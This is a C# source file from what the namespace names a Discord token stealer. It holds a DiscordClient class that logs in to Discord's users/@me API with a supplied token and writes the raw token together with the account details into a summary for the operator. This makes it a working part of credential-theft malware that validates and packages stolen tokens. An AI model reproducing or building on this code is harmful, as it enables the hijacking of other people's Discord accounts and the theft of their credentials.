using System.Net;
using System.Text;
using System.Text.Json;

namespace DiscordTokenStealer.Discord;

public class DiscordClient : IDisposable
{
    private readonly string _token;
    private readonly HttpClient _httpClient;
    public DiscordClient(string token)
    {
        _token = token;
        _httpClient = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
        {
            Timeout = TimeSpan.FromSeconds(15),
            BaseAddress = new Uri("https://discordapp.com/api/")
        };
        _httpClient.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", token);
    }

    public async Task<string?> GetUserSummary(CancellationToken cts = default)
    {
        DiscordUser? user = await LoginAsync(cts);
        if (user == null)
        {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        sb.AppendLine($"\t{_token}");
        sb.AppendLine(user.ToString());
        return sb.ToString();
    }

    private async Task<DiscordUser?> LoginAsync(CancellationToken cts = default)
    {
        using HttpResponseMessage response = await _httpClient.GetAsync("users/@me", cts);
        if (response.StatusCode != HttpStatusCode.OK)
        {
            return null;
        }
        await using Stream json = await response.Content.ReadAsStreamAsync(cts);
        return await JsonSerializer.DeserializeAsync<DiscordUser>(json, (JsonSerializerOptions?)null, cts);
    }

    public void Dispose()
    {
        _httpClient.Dispose();
        GC.SuppressFinalize(this);
    }
}
